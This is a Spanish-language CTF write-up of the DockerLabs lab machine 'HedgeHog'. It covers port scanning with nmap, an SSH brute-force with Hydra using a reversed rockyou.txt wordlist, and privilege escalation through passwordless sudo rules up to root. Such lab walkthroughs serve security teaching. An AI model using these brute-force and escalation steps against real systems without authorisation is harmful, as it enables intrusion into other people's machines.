
# HedgeHog

![login](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/inicioHedHog.png)

### 1. Verificación de Conectividad
Comenzamos con un **ping** para comprobar si la máquina objetivo está activa.

```bash
ping 172.17.0.2
```

Observamos que responde correctamente, lo que indica que está en línea.

### 2. Escaneo de Puertos con Nmap
Ejecutamos un escaneo completo de puertos para identificar los servicios en ejecución:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

#### **Resultados:**
- **Puerto 22 (SSH)** → Servicio de acceso remoto seguro.
- **Puerto 80 (HTTP)** → Servicio web.

Para obtener más detalles, ejecutamos un escaneo de versiones y servicios:

```bash
sudo nmap -sC -sV -p 22,80 172.17.0.2
```

---

## Enumeración Web

Abrimos el navegador y accedemos a `http://172.17.0.2` para analizar el contenido visible.

También usamos **Gobuster** para buscar directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

No encontramos resultados relevantes, por lo que pasamos a otra estrategia.

---

## Ataque de Fuerza Bruta (SSH)

Intentamos un ataque con **Hydra**, pero detectamos que es demasiado lento. Decidimos optimizar el diccionario **rockyou.txt** invirtiéndolo, ya que el nombre *tails* sugiere trabajar con "colas".

### **Invirtiendo el Diccionario**

```bash
tac rockyou.txt >> invertido.txt
```

- `tac rockyou.txt` → Invierte el contenido del archivo, mostrando la última línea primero.
- `>> invertido.txt` → Guarda el resultado en un nuevo archivo.

### **Eliminando Espacios en Blanco**
Algunas líneas pueden tener espacios al inicio, lo que afectaría el ataque. Eliminamos estos espacios con:

```bash
sed -i 's/ //g' invertido.txt
```

### **Ejecutando Hydra**

Ahora ejecutamos **Hydra** con el diccionario optimizado:

```bash
hydra -l tails -P invertido.txt ssh://172.17.0.2
```

Se obtiene un usuario y contraseña válidos para SSH.

---

## Acceso a la Máquina Objetivo

Al intentar conectarnos por SSH, obtenemos un error relacionado con la clave del host. Lo solucionamos con:

```bash
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
```

Ahora podemos conectarnos:

```bash
ssh tails@172.17.0.2
```

Ingresamos la contraseña obtenida y accedemos correctamente.

---

## Escalada de Privilegios

### **1. Verificando Permisos de `sudo`**

```bash
tails@40336695dba7:~$ sudo -l
```

#### **Resultado:**
El usuario `tails` puede ejecutar comandos como `sonic` sin contraseña (`NOPASSWD: ALL`).

### **2. Cambiando de Usuario `tails` a `sonic`**

```bash
tails@40336695dba7:~$ sudo -u sonic /bin/bash
```

### **3. Verificando Usuario Actual**

```bash
sonic@40336695dba7:/home/tails$ whoami
sonic
```

### **4. Verificando Permisos de `sudo` para `sonic`**

```bash
sonic@40336695dba7:/home/tails$ sudo -l
```

#### **Resultado:**
El usuario `sonic` puede ejecutar cualquier comando como cualquier usuario (`ALL`), sin necesidad de contraseña.

### **5. Escalar a `root`**

```bash
sonic@40336695dba7:/home/tails$ sudo -u root /bin/bash
```

### **6. Verificación Final**

```bash
root@40336695dba7:/home/tails# whoami
root
```

Ahora tenemos acceso total al sistema como `root`.

---

## **Resumen del Ataque**

1. **Reconocimiento:** Identificamos puertos abiertos y analizamos servicios.
2. **Enumeración:** No encontramos archivos ocultos en la web.
3. **Fuerza Bruta (SSH):** Optimizamos el diccionario `rockyou.txt` y logramos acceso con `Hydra`.
4. **Acceso Inicial:** Nos conectamos vía SSH como `tails`.
5. **Escalada de Privilegios:**
   - `tails` → `sonic` (mediante `sudo` sin contraseña).
   - `sonic` → `root` (permiso total en `sudo`).

Con esto, logramos el control total del sistema.<br>

⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/


Hasta la próxima, hackers.

